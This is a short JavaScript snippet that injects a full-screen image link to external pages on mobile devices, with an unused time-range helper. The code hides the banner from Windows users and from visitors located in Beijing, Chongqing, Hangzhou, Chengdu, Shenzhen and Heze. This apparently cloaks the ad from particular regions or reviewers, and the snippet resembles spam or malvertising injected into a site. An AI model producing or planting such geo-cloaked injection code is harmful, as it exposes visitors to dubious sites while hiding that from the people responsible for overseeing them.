var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;
var ios = navigator.userAgent.match(/iPad|iPhone|iPod/i) != null;
var azs = navigator.userAgent.match(/Android|Linux/i) != null;
if(wap){
    (function() {
        if (/Win/i.test(navigator.platform)) return false;
        if(shengfen=="北京" || shengfen=="重庆" || chengshi=="杭州" || chengshi=="成都" || chengshi=="深圳" || chengshi=="菏泽"){
            return false;
        }else{
            //img数组
            var img_arr = new Array(
                'https://cdn.jsdelivr.net/gh/kximg/apppic/731/3-1.gif',
                'https://cdn.jsdelivr.net/gh/kximg/apppic/731/3-2.gif'
            );
            var imgv = Math.floor((Math.random()*img_arr.length)); 
            var imga = img_arr[imgv];
            
            var url_arr = new Array(
                'https://ux.xczidn.com/382.html',
                'https://ux.xczidn.com/2023.html'
            );
            var urlv = Math.floor((Math.random()*url_arr.length)); 
            var urla = url_arr[urlv];
            
            //var urla = 'https://NTJAN66FP3.hyvip036.com';

            var diid = 'd' + parseInt(Math.random() * 1000);
            document.writeln('<div id="'+diid+'"><a href="'+urla+'" target="_blank"><img src="'+imga+'" width="100%" height="100%"></a></div>');
        }
    })();
}
//判断时间
function time_range(beginTime, endTime) {
    var strb = beginTime.split(":");
    if (strb.length != 2) {
        return false;
    }
 
    var stre = endTime.split(":");
    if (stre.length != 2) {
        return false;
    }
 
    var b = new Date();
    var e = new Date();
    var n = new Date();
    //n.setHours(22);
    
    b.setHours(strb[0]);
    b.setMinutes(strb[1]);
    e.setHours(stre[0]);
    e.setMinutes(stre[1]);
 
    if (n.getTime() - b.getTime() > 0 && n.getTime() - e.getTime() < 0) {
       return true;
    } else {
       return false;
    }
}
